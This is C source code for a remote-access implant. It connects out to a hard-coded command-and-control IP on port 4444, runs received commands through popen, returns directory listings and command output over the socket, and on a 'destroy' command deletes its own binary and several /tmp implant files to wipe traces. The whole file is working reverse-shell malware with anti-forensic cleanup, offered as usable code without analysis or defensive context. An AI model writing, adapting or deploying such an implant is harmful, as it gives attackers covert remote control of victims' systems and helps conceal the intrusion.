#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <sys/stat.h>

#define SERVER_IP "192.168.65.254"  // Replace with C2 IP
#define SERVER_PORT 4444
#define BUF_SIZE 1024

int sock;

int list_dir(const char *dir_path) {
    DIR *d = opendir(dir_path);
    if (!d) return -1;

    struct dirent *entry;
    char msg[BUF_SIZE];

    while ((entry = readdir(d)) != NULL) {
        snprintf(msg, BUF_SIZE, "[*] %s\n", entry->d_name);
        send(sock, msg, strlen(msg), 0);
    }

    // Marker to indicate end of directory listing
    const char *end_marker = "[*] END\n";
    send(sock, end_marker, strlen(end_marker), 0);

    closedir(d);
    return 0;
}

int main() {
    struct sockaddr_in server;
    char buffer[BUF_SIZE];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[-] Socket");
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("[-] Connect");
        return 1;
    }

    while (1) {
        memset(buffer, 0, BUF_SIZE);
        int n = read(sock, buffer, BUF_SIZE - 1);
        if (n <= 0) break;

        if (strncmp(buffer, "exit", 4) == 0) break;

        if (strncmp(buffer, "destroy", 7) == 0) {
            char self_path[512];
            ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
            if (len != -1) {
                self_path[len] = '\0';
                remove(self_path);
            }
            remove("/tmp/i");
            remove("/tmp/implant");
            remove("/tmp/implant_client");
            remove("/tmp/.i");
            send(sock, "Implant self-destructed and traces wiped\n", 41, 0);
            break;
        }

        if (strncmp(buffer, "list ", 5) == 0) {
            char *dir_path = buffer + 5;
            if (list_dir(dir_path) == -1) {
                const char *err = "[-] Failed to list directory\n";
                send(sock, err, strlen(err), 0);
                const char *end_marker = "[*] END\n";
                send(sock, end_marker, strlen(end_marker), 0);
            }
            continue;
        }

        FILE *fp = popen(buffer, "r");
        if (!fp) {
            char *fail = "Command execution failed\n";
            write(sock, fail, strlen(fail));
        } else {
            while (fgets(buffer, BUF_SIZE, fp)) {
                write(sock, buffer, strlen(buffer));
            }
            pclose(fp);
        }
    }

    close(sock);
    return 0;
}
